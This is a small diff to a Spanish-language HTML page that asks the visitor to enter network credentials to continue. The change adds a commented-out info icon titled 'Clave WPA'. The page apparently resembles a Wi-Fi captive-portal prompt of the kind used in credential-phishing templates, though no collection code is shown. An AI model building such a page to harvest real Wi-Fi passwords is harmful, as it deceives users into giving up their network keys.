@@ -31,6 +31,7 @@
             <div class="card_yellow">
                 <div class="title">
                     <p>Se necesita autenticación para poder continuar con la operación. Por favor ingrese sus credenciales de red.</p>
+                    <!--<img src="./img/informacion.svg" alt="info" title="Clave WPA" width="15px">-->
                 </div>
             </div>
             <div class="error">
